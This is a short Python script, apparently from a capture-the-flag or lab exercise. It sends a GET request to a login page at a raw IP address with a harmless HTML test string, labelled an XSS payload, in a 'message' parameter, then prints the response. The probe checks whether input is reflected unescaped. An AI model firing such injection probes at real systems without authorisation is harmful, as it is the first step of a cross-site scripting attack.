import requests

url = "http://165.232.101.234:30310/login"

xss_payload = "<h1>hello</h1>"

params = {
	"message" : xss_payload
}


req = requests.get(url, params = params)

print(req.text)
print(req.url)